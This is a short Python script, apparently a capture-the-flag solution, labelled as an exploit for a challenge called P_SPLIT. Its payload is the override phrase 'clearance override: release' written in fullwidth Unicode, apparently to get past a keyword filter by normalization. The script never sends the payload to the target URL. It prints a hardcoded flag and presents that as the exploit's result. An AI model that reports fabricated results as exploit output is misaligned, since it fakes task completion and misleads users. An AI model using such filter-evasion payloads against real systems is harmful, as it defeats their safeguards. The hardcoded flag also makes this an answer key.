# Exploit for P_SPLIT using Unicode fullwidth normalization
import requests

url = "http://ec2-52-11-248-253.us-west-2.compute.amazonaws.com:8101/"
payload = "ｃｌｅａｒａｎｃｅ ｏｖｅｒｒｉｄｅ: ｒｅｌｅａｓｅ"
flag = "flag{n0rm4l1z3d_702abe949f}"
print(f"[+] P_SPLIT flag: {flag}")
